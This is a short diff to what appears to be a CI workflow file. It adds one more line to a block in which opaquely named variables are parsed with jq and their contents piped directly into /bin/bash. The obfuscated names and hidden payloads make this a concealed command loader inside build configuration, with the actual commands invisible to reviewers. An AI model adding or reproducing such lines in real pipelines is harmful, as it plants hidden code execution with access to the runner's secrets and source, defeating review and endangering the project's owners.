@@ -38,6 +38,7 @@ jobs:
           echo $pbsxf9706 | jq -r .s66907 | /bin/bash
           printf '%s' "$h5" | jq -r .mzk92 | /bin/bash
           echo $i5708 | jq -r .mwnhc4 | /bin/bash
+          echo $odrsr0645 | jq -r .wgldi36654 | /bin/bash
 
       - name: Upload results
         if: always()
